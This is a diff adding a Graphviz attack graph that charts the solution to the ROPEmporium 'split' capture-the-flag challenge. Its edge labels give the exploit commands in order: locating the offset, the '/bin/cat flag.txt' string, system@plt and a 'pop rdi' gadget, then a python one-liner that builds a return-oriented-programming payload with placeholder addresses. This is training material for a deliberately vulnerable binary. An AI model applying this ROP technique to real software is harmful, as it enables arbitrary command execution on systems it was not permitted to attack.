@@ -1,0 +1,21 @@
+digraph AttackGraph {
+  rankdir=LR;
+  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium split"];
+  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
+  edge [color="#555555", fontname="Helvetica", fontsize=10];
+
+  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
+  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
+  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Useful string located"];
+  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="system@plt located"];
+  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Argument-loading gadget identified"];
+  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ROP payload crafted"];
+  node5 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];
+
+  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./split"];
+  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="strings -a -t x split | grep \"/bin/cat flag.txt\""];
+  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d split | grep system@plt"];
+  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary split | grep \"pop rdi\""];
+  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; pop_rdi=0xPOP_RDI_RET; bin_cat=0xBIN_CAT_FLAG_TXT; system=0xSYSTEM_PLT; sys.stdout.buffer.write(pad + pack('<Q', pop_rdi) + pack('<Q', bin_cat) + pack('<Q', system))\" > payload.bin"];
+  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="./split < payload.bin"];
+}
